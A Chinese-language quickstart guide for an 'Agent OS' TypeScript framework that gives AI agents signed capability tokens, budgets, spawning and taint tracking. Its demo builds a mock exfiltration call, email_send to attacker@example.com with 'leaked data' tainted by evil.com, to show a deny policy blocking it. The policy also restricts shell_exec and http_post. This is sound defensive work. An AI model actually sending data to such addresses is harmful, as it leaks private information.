# Agent OS 快速启动指南

> 本指南帮助开发者快速搭建 Agent OS 开发环境并运行第一个示例。

**预计时间**: 30 分钟  
**前置知识**: TypeScript 基础、npm 使用

---

## 1. 环境准备

### 1.1 Node.js 安装

```bash
# 检查 Node.js 版本
node --version
# 要求 >= 22.0.0

# 使用 nvm 安装 (可选)
nvm install 22
nvm use 22
```

### 1.2 项目初始化

```bash
# 创建项目目录
mkdir my-agent-os && cd my-agent-os

# 初始化 npm
npm init -y

# 安装 TypeScript 和 vitest
npm install -D typescript @types/node vitest

# 初始化 tsconfig
npx tsc --init
```

### 1.3 配置 TypeScript

```json
// tsconfig.json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "declaration": true,
    "sourceMap": true,
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "outDir": "./dist"
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist", "test"]
}
```

### 1.4 package.json 配置

```json
{
  "name": "my-agent-os",
  "version": "1.0.0",
  "type": "module",
  "main": "./dist/index.js",
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "typecheck": "tsc --noEmit"
  }
}
```

---

## 2. 项目结构

```
my-agent-os/
├── src/
│   ├── types.ts       # 核心类型定义
│   ├── acap.ts        # 能力令牌
│   ├── budget.ts      # 配额追踪
│   ├── spawn.ts       # 智能体派生
│   ├── taint.ts       # 污染追踪
│   ├── vault.ts        # 凭证保险库
│   ├── outcomes.ts     # 评分迭代
│   └── index.ts       # 主入口
├── test/
│   └── *.test.ts
├── package.json
└── tsconfig.json
```

---

## 3. 核心类型实现 (types.ts)

创建 `src/types.ts`:

```typescript
// 品牌类型
export type AgentId = string & { readonly __agent_id: unique symbol }
export type CredentialRef = string & { readonly __cred_ref: unique symbol }
export type CredentialValue = string & { readonly __cred_value: unique symbol }

// 签名
export interface ManifestSignature {
  readonly algorithm: 'hmac-sha256' | 'ed25519'
  readonly signer: string
  readonly signature: string
  readonly signed_at: string
}

// 能力主体
export type ACapSubject =
  | { readonly kind: 'tool'; readonly name: string }
  | { readonly kind: 'mcp_server'; readonly server: string }
  | { readonly kind: 'resource'; readonly uri: string }
  | { readonly kind: 'memory_block'; readonly block_id: string }
  | { readonly kind: 'audit_log'; readonly namespace: string }
  | { readonly kind: 'agent_handoff'; readonly target_pattern: string }

export interface ACapRequest {
  readonly subject: ACapSubject
  readonly scope: ReadonlyArray<string>
  readonly max_invocations?: number
  readonly justification: string
}

export interface ACap extends ACapRequest {
  readonly id: string
  readonly granted_to: AgentId
  readonly granted_by: AgentId
  readonly granted_at: string
  readonly expires_at: string
  readonly signature: ManifestSignature
  readonly invocations: number
}

// 命名空间
export interface NamespaceSpec {
  readonly name: string
  readonly memory: ReadonlyArray<string>
  readonly tools: ReadonlyArray<string>
  readonly audit_namespace: string
  readonly mounts: ReadonlyArray<{
    readonly namespace: string
    readonly mode: 'read' | 'read-write'
  }>
}

// 预算
export interface AgentBudget {
  readonly max_input_tokens: number
  readonly max_output_tokens: number
  readonly max_wall_clock_seconds: number
  readonly max_cost_usd: number
  readonly max_children: number
  readonly warn_at?: {
    readonly tokens?: number
    readonly wall_clock?: number
    readonly cost?: number
  }
}

export interface BudgetUsage {
  readonly input_tokens: number
  readonly output_tokens: number
  readonly wall_clock_seconds: number
  readonly cost_usd: number
  readonly children_spawned: number
}

// 污染
export type TaintSource = 'fetched_url' | 'email' | 'user_input' | 'untrusted_file' | 'agent_message'

export interface Taint {
  readonly source: TaintSource
  readonly origin: string
  readonly introduced_at: string
}

export interface ToolCall {
  readonly tool: string
  readonly args: unknown
  readonly caller: AgentId
  readonly acap: string
  readonly taints: ReadonlyArray<Taint>
}

export interface ToolCallResult {
  readonly tool: string
  readonly value: unknown
  readonly produced_at: string
  readonly taints: ReadonlyArray<Taint>
}

// Manifest
export interface AgentManifest {
  readonly id: AgentId
  readonly parent: AgentId | null
  readonly purpose: string
  readonly requested_capabilities: ACapRequest[]
  readonly budget: AgentBudget
  readonly namespace: NamespaceSpec
  readonly signature?: ManifestSignature
  readonly created_at: string
}

// Result 类型
export type OSErrorCode =
  | 'capability_denied'
  | 'capability_expired'
  | 'capability_exhausted'
  | 'budget_exceeded'
  | 'namespace_violation'
  | 'taint_violation'
  | 'handoff_escalation_denied'
  | 'manifest_invalid'
  | 'snapshot_not_found'
  | 'parent_not_found'

export interface OSError {
  readonly code: OSErrorCode
  readonly message: string
  readonly details?: Record<string, unknown>
}

export type OSResult<T> =
  | { readonly ok: true; readonly value: T }
  | { readonly ok: false; readonly error: OSError }

export function ok<T>(value: T): OSResult<T> {
  return { ok: true, value }
}

export function err(code: OSErrorCode, message: string, details?: Record<string, unknown>): OSResult<never> {
  return { ok: false, error: { code, message, ...(details && { details }) } }
}
```

---

## 4. 能力令牌实现 (acap.ts)

创建 `src/acap.ts`:

```typescript
import { createHmac, randomBytes, timingSafeEqual } from 'node:crypto'
import type { ACap, ACapRequest, AgentId, ManifestSignature, OSResult } from './types.js'
import { err, ok } from './types.js'

function canonicalize(value: unknown): string {
  if (value === null) return 'null'
  if (typeof value === 'string') return JSON.stringify(value)
  if (typeof value === 'number' || typeof value === 'boolean') return JSON.stringify(value)
  if (Array.isArray(value)) return '[' + value.map(canonicalize).join(',') + ']'
  if (typeof value === 'object') {
    const v = value as Record<string, unknown>
    const keys = Object.keys(v).sort()
    return '{' + keys.map(k => JSON.stringify(k) + ':' + canonicalize(v[k])).join(',') + '}'
  }
  throw new Error(`canonicalize: unsupported type ${typeof value}`)
}

function signAcap(acap: Omit<ACap, 'signature' | 'invocations'>, signer: AgentId, key: Buffer): ManifestSignature {
  const signed_at = new Date().toISOString()
  const payload = canonicalize({
    id: acap.id, subject: acap.subject, scope: [...acap.scope],
    justification: acap.justification, max_invocations: acap.max_invocations ?? null,
    granted_to: acap.granted_to, granted_by: acap.granted_by,
    granted_at: acap.granted_at, expires_at: acap.expires_at, signer, signed_at,
  })
  const signature = createHmac('sha256', key).update(payload, 'utf8').digest('hex')
  return { algorithm: 'hmac-sha256', signer, signature, signed_at }
}

export class RevocationList {
  private readonly revoked = new Set<string>()
  revoke(acap_id: string): void { this.revoked.add(acap_id) }
  isRevoked(acap_id: string): boolean { return this.revoked.has(acap_id) }
}

export interface GrantOptions {
  readonly granted_by: AgentId
  readonly granted_to: AgentId
  readonly expires_at: string
  readonly signing_key: Buffer
}

export function grant(request: ACapRequest, opts: GrantOptions): ACap {
  const id = randomBytes(16).toString('hex')
  const granted_at = new Date().toISOString()
  const acap: Omit<ACap, 'signature' | 'invocations'> = {
    id, subject: request.subject, scope: request.scope,
    justification: request.justification,
    ...(request.max_invocations !== undefined && { max_invocations: request.max_invocations }),
    granted_to: opts.granted_to, granted_by: opts.granted_by, granted_at, expires_at: opts.expires_at,
  }
  const signature = signAcap(acap, opts.granted_by, opts.signing_key)
  return { ...acap, signature, invocations: 0 }
}

export interface VerifyOptions {
  readonly trust: ReadonlyMap<AgentId, Buffer>
  readonly revocations?: RevocationList
  readonly now?: Date
}

export function verify(acap: ACap, opts: VerifyOptions): OSResult<true> {
  const now = (opts.now ?? new Date()).getTime()
  const expires = Date.parse(acap.expires_at)
  if (Number.isFinite(expires) && now >= expires) return err('capability_expired', `expired at ${acap.expires_at}`)
  if (acap.max_invocations !== undefined && acap.invocations >= acap.max_invocations)
    return err('capability_exhausted', `${acap.invocations}/${acap.max_invocations}`)
  if (opts.revocations?.isRevoked(acap.id) === true) return err('capability_denied', 'revoked')
  const key = opts.trust.get(acap.signature.signer as AgentId)
  if (!key) return err('capability_denied', 'signer not in trust set')
  const { signature, invocations, ...skeleton } = acap
  const expected = signAcap(skeleton, acap.signature.signer as AgentId, key)
  const a = Buffer.from(signature.signature, 'hex')
  const b = Buffer.from(expected.signature, 'hex')
  if (a.length !== b.length || !timingSafeEqual(a, b)) return err('capability_denied', 'invalid signature')
  return ok(true)
}

export function downscope(source: ACap, request: Partial<ACapRequest> & { granted_to: AgentId; signing_key: Buffer }): OSResult<ACap> {
  const subject = request.subject ?? source.subject
  if (subject.kind !== source.subject.kind)
    return err('handoff_escalation_denied', `cannot change subject kind`)
  const requestedScope = new Set(request.scope ?? source.scope)
  for (const s of requestedScope) if (!source.scope.includes(s))
    return err('handoff_escalation_denied', `cannot add scope "${s}"`)
  const sourceMax = source.max_invocations
  const requestedMax = request.max_invocations
  if (sourceMax !== undefined && (requestedMax === undefined || requestedMax > sourceMax))
    return err('handoff_escalation_denied', 'cannot increase max_invocations')
  const sourceRemaining = sourceMax !== undefined ? sourceMax - source.invocations : Number.POSITIVE_INFINITY
  if (requestedMax !== undefined && requestedMax > sourceRemaining)
    return err('handoff_escalation_denied', `cannot grant more than remaining (${sourceRemaining})`)
  return ok(grant({
    subject, scope: [...requestedScope], justification: request.justification ?? `downscoped from ${source.id}`,
    ...(requestedMax !== undefined && { max_invocations: requestedMax }),
  }, { granted_to: request.granted_to, granted_by: source.granted_to, expires_at: source.expires_at, signing_key: request.signing_key }))
}
```

---

## 5. 智能体派生实现 (spawn.ts)

创建 `src/spawn.ts`:

```typescript
import { randomBytes } from 'node:crypto'
import type { AgentId, AgentManifest, AgentBudget, NamespaceSpec, ACapRequest, OSResult } from './types.js'
import { err, ok } from './types.js'

export class BudgetTracker {
  private usage = { input_tokens: 0, output_tokens: 0, wall_clock_seconds: 0, cost_usd: 0, children_spawned: 0 }
  private readonly start = Date.now()

  constructor(private readonly budget: AgentBudget) {}

  current() { return { ...this.usage, wall_clock_seconds: (Date.now() - this.start) / 1000 } }

  canCharge(input: number, output: number, cost: number): OSResult<true> {
    if (this.usage.input_tokens + input > this.budget.max_input_tokens)
      return err('budget_exceeded', 'input tokens exceeded')
    if (this.usage.output_tokens + output > this.budget.max_output_tokens)
      return err('budget_exceeded', 'output tokens exceeded')
    if (this.usage.cost_usd + cost > this.budget.max_cost_usd)
      return err('budget_exceeded', 'cost exceeded')
    if ((Date.now() - this.start) / 1000 > this.budget.max_wall_clock_seconds)
      return err('budget_exceeded', 'wall clock exceeded')
    return ok(true)
  }

  charge(input: number, output: number, cost: number): OSResult<null> {
    const check = this.canCharge(input, output, cost)
    if (!check.ok) return check
    this.usage = { ...this.usage, input_tokens: this.usage.input_tokens + input, output_tokens: this.usage.output_tokens + output, cost_usd: this.usage.cost_usd + cost }
    return ok(null)
  }

  canSpawn(): OSResult<true> {
    if (this.usage.children_spawned >= this.budget.max_children) return err('budget_exceeded', 'max children reached')
    return ok(true)
  }

  recordSpawn(): void { this.usage = { ...this.usage, children_spawned: this.usage.children_spawned + 1 } }
}

export interface SpawnRequest {
  readonly parent: AgentId | null
  readonly purpose: string
  readonly requested_capabilities: ACapRequest[]
  readonly budget: AgentBudget
  readonly namespace: NamespaceSpec
}

export interface SpawnContext { readonly registry: AgentRegistry }

export class AgentRegistry {
  private readonly agents = new Map<AgentId, RegisteredAgent>()
  register(agent: RegisteredAgent): OSResult<true> {
    if (this.agents.has(agent.manifest.id)) return err('manifest_invalid', 'already registered')
    this.agents.set(agent.manifest.id, agent)
    return ok(true)
  }
  get(id: AgentId) { return this.agents.get(id) }
  has(id: AgentId) { return this.agents.has(id) }
  children(id: AgentId | null): AgentId[] {
    const out: AgentId[] = []
    for (const [child_id, agent] of this.agents) if (agent.manifest.parent === id) out.push(child_id)
    return out
  }
  ancestors(id: AgentId): AgentId[] {
    const chain: AgentId[] = []
    let cursor: AgentId | null = id
    while (cursor !== null) {
      const agent = this.agents.get(cursor)
      if (!agent) break
      chain.push(cursor)
      cursor = agent.manifest.parent
    }
    return chain
  }
}

export interface RegisteredAgent { readonly manifest: AgentManifest; readonly tracker: BudgetTracker }

export function spawn(request: SpawnRequest, ctx: SpawnContext): OSResult<RegisteredAgent> {
  if (request.parent !== null) {
    const parent = ctx.registry.get(request.parent)
    if (!parent) return err('parent_not_found', `parent ${request.parent} not found`)
    const spawnCheck = parent.tracker.canSpawn()
    if (!spawnCheck.ok) return spawnCheck
    parent.tracker.recordSpawn()
  }
  const id = ('agent_' + randomBytes(10).toString('hex')) as AgentId
  const manifest: AgentManifest = { id, parent: request.parent, purpose: request.purpose, requested_capabilities: request.requested_capabilities, budget: request.budget, namespace: request.namespace, created_at: new Date().toISOString() }
  const tracker = new BudgetTracker(request.budget)
  const agent: RegisteredAgent = { manifest, tracker }
  const reg = ctx.registry.register(agent)
  if (!reg.ok) return reg
  return ok(agent)
}
```

---

## 6. 污染追踪实现 (taint.ts)

创建 `src/taint.ts`:

```typescript
import type { Taint, TaintSource, ToolCall, ToolCallResult, OSResult } from './types.js'
import { err, ok } from './types.js'

export interface TaintPolicy {
  readonly blocks: ReadonlyMap<string, ReadonlySet<TaintSource>>
  readonly untaint_allowlist: ReadonlySet<string>
}

export const DEFAULT_TAINT_POLICY: TaintPolicy = {
  blocks: new Map([
    ['email_send', new Set(['fetched_url', 'email', 'agent_message', 'untrusted_file'] as TaintSource[])],
    ['http_post', new Set(['fetched_url', 'email', 'agent_message', 'untrusted_file'] as TaintSource[])],
    ['file_write', new Set(['fetched_url', 'email', 'agent_message'] as TaintSource[])],
    ['shell_exec', new Set(['fetched_url', 'email', 'user_input', 'agent_message', 'untrusted_file'] as TaintSource[])],
    ['mcp_send', new Set(['fetched_url', 'email', 'agent_message', 'untrusted_file'] as TaintSource[])],
  ]),
  untaint_allowlist: new Set(['compliance.untaint']),
}

export function checkTaint(call: ToolCall, policy: TaintPolicy = DEFAULT_TAINT_POLICY): OSResult<true> {
  const blocked = policy.blocks.get(call.tool)
  if (!blocked) return ok(true)
  for (const taint of call.taints) {
    if (blocked.has(taint.source)) {
      return err('taint_violation', `tool ${call.tool} refuses input tainted by ${taint.source}`, {
        tool: call.tool, taint_source: taint.source, taint_origin: taint.origin,
      })
    }
  }
  return ok(true)
}

export function propagate(call: ToolCall, raw_value: unknown, introduces?: TaintSource): ToolCallResult {
  const inherited = [...call.taints]
  if (introduces) {
    const origin = typeof call.args === 'object' && call.args !== null && 'url' in call.args
      ? String((call.args as { url: unknown }).url) : call.tool
    inherited.push({ source: introduces, origin, introduced_at: new Date().toISOString() })
  }
  return { tool: call.tool, value: raw_value, produced_at: new Date().toISOString(), taints: inherited }
}

export function untaint(result: ToolCallResult, performed_by_tool: string, policy: TaintPolicy = DEFAULT_TAINT_POLICY): OSResult<ToolCallResult> {
  if (!policy.untaint_allowlist.has(performed_by_tool))
    return err('taint_violation', `tool ${performed_by_tool} not on untaint allowlist`)
  return ok({ ...result, taints: [] })
}
```

---

## 7. 第一个示例

创建 `examples/demo.ts`:

```typescript
import { randomBytes } from 'node:crypto'
import { AgentRegistry, spawn } from '../src/spawn.js'
import { grant, verify, RevocationList } from '../src/acap.js'
import { checkTaint, propagate, DEFAULT_TAINT_POLICY } from '../src/taint.js'
import type { AgentId } from '../src/types.js'

async function main() {
  console.log('=== Agent OS Demo ===\n')

  // 1. 创建注册表
  const registry = new AgentRegistry()
  const key = randomBytes(32)
  const trust = new Map<AgentId, Buffer>()

  // 2. 派生根智能体
  console.log('1. Spawning root agent...')
  const root = spawn({
    parent: null,
    purpose: 'orchestrator',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 100_000,
      max_output_tokens: 50_000,
      max_wall_clock_seconds: 600,
      max_cost_usd: 5.0,
      max_children: 10,
    },
    namespace: {
      name: 'root',
      memory: [],
      tools: ['http_get', 'email_send'],
      audit_namespace: 'root:audit',
      mounts: [],
    },
  }, { registry })
  
  if (!root.ok) {
    console.error('Failed to spawn root:', root.error)
    return
  }
  trust.set(root.value.manifest.id, key)
  console.log(`   Root agent: ${root.value.manifest.id}\n`)

  // 3. 派生子智能体
  console.log('2. Spawning child agent...')
  const child = spawn({
    parent: root.value.manifest.id,
    purpose: 'fetcher',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 10_000,
      max_output_tokens: 5_000,
      max_wall_clock_seconds: 60,
      max_cost_usd: 0.5,
      max_children: 0,
    },
    namespace: {
      name: 'fetcher',
      memory: [],
      tools: ['http_get'],
      audit_namespace: 'root:fetcher:audit',
      mounts: [],
    },
  }, { registry })
  
  if (!child.ok) {
    console.error('Failed to spawn child:', child.error)
    return
  }
  console.log(`   Child agent: ${child.value.manifest.id}\n`)

  // 4. 授予能力
  console.log('3. Granting capability...')
  const cap = grant({
    subject: { kind: 'tool', name: 'http_get' },
    scope: ['invoke'],
    max_invocations: 3,
    justification: 'fetch external docs',
  }, {
    granted_by: root.value.manifest.id,
    granted_to: child.value.manifest.id,
    expires_at: new Date(Date.now() + 3600_000).toISOString(),
    signing_key: key,
  })
  console.log(`   Capability: ${cap.id} (${cap.subject.kind}:${cap.subject.name})\n`)

  // 5. 验证能力
  console.log('4. Verifying capability...')
  const check = verify(cap, { trust })
  console.log(`   Verify result: ${check.ok ? 'OK' : check.error.code}\n`)

  // 6. 污染追踪
  console.log('5. Taint tracking demo...')
  const taintedCall = {
    tool: 'email_send',
    args: { to: 'attacker@example.com', body: 'leaked data' },
    caller: child.value.manifest.id,
    acap: cap.id,
    taints: [{ source: 'fetched_url' as const, origin: 'https://evil.com', introduced_at: new Date().toISOString() }],
  }
  const taintResult = checkTaint(taintedCall, DEFAULT_TAINT_POLICY)
  console.log(`   email_send with tainted input: ${taintResult.ok ? 'ALLOWED' : 'BLOCKED (' + taintResult.error.code + ')'}\n`)

  // 7. 模拟工具调用
  console.log('6. Tool call with propagation...')
  const cleanCall = {
    tool: 'http_get',
    args: { url: 'https://api.example.com/data' },
    caller: child.value.manifest.id,
    acap: cap.id,
    taints: [],
  }
  const result = propagate(cleanCall, { status: 200, data: '...' }, 'fetched_url')
  console.log(`   Output taints: ${result.taints.map(t => t.source).join(', ')}\n`)

  // 8. 预算追踪
  console.log('7. Budget tracking...')
  const chargeResult = child.value.tracker.charge(1000, 500, 0.01)
  console.log(`   Charge result: ${chargeResult.ok ? 'OK' : chargeResult.error.code}`)
  console.log(`   Current usage: ${JSON.stringify(child.value.tracker.current())}\n`)

  console.log('=== Demo Complete ===')
}

main().catch(console.error)
```

---

## 8. 运行

```bash
# 编译
npm run build

# 运行示例
npx tsx examples/demo.ts

# 运行测试
npm run test
```

---

## 9. 预期输出

```
=== Agent OS Demo ===

1. Spawning root agent...
   Root agent: agent_a1b2c3d4e5f6

2. Spawning child agent...
   Child agent: agent_f6e5d4c3b2a1

3. Granting capability...
   Capability: abc123def456 (tool:http_get)

4. Verifying capability...
   Verify result: OK

5. Taint tracking demo...
   email_send with tainted input: BLOCKED (taint_violation)

6. Tool call with propagation...
   Output taints: fetched_url

7. Budget tracking...
   Charge result: OK
   Current usage: {"input_tokens":1000,"output_tokens":500,"cost_usd":0.01,"children_spawned":0,"wall_clock_seconds":0.1}

=== Demo Complete ===
```

---

## 10. 下一步

| 资源 | 描述 |
|------|------|
| [PRD.md](./PRD.md) | 完整产品需求文档 |
| [ARCHITECTURE.md](./ARCHITECTURE.md) | 架构设计文档 |
| [DETAIL-DESIGN.md](./DETAIL-DESIGN.md) | 详细设计文档 |
| [../handbook/00-overview.md](../handbook/00-overview.md) | 研发知识体系分析 |
